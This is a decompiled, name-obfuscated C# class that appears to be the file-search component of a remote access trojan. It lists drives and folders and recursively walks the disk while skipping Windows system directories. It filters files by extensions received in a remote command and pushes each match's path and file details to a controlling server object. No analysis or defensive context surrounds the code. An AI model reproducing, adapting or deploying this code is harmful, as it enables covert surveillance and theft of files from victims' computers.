using System;
using System.Collections.Generic;
using System.IO;

namespace igtmntina;

internal class DAKZRIVF
{
	public List<string> igtmntinasFiles = new List<string>();

	public List<string> igtmntinanotFilders = new List<string>();

	public int igtmntinafIndx = 0;

	public bool igtmntinareaging = false;

	public MAKEDM iserver;

	public List<string> igtmntinafExts = new List<string>();

	public int igtmntinasIndx = 0;

	public bool igtmntinaseeAccess(string fPath)
	{
		try
		{
			new DirectoryInfo(fPath).GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string igtmntinalookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">".ToString();
			}
		}
		return text.ToString();
	}

	public DAKZRIVF()
	{
		igtmntinanotFilders.Add("program files".ToString());
		igtmntinanotFilders.Add("system volume information".ToString());
		igtmntinanotFilders.Add("$recycle.bin".ToString());
		igtmntinanotFilders.Add("msocache".ToString());
		igtmntinanotFilders.Add("recoveDSDF".ToString());
		igtmntinanotFilders.Add("documents and settings".ToString());
		igtmntinanotFilders.Add("windows".ToString());
		igtmntinanotFilders.Add("program files (x86)".ToString());
		igtmntinanotFilders.Add("programdata".ToString());
	}

	public string igtmntinalookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">".ToString();
			}
		}
		return text;
	}

	public void igtmntinasendSearch(string path, string mycmd)
	{
		try
		{
			foreach (string item in igtmntinaaddFiles(path))
			{
				int num = item.LastIndexOf(".".ToString());
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num).ToString();
				if (igtmntinafExts.Contains(text.ToLower()))
				{
					string text2 = iserver.igtmntinafile_info(item, ret: true).ToString();
					iserver.igtmntinapush_data(null, mycmd + "=" + item + "<FILE_AUTO<".ToString() + text2);
				}
				if (iserver.igtmntinaautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public IEnumerable<string> igtmntinaaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.igtmntinaautCnls)
		{
			path = moreFiles.Dequeue().ToString();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (igtmntinaseeAccess(text) && !igtmntinanotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void igtmntinalookFiles(string tempStr, string mycmd)
	{
		iserver.igtmntinaautCnls = false;
		igtmntinafExts.Clear();
		igtmntinasFiles.Clear();
		igtmntinafIndx = 0;
		igtmntinasIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				igtmntinafExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			igtmntinareaging = true;
			igtmntinasendSearch(array[1], mycmd);
			igtmntinareaging = false;
			iserver.igtmntinapush_data(null, "htintn-seard=".ToString());
		}
	}

	public string igtmntinacheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (igtmntinaseeAccess(text2))
				{
					text = text + text2 + ">".ToString();
				}
			}
		}
		return text;
	}
}
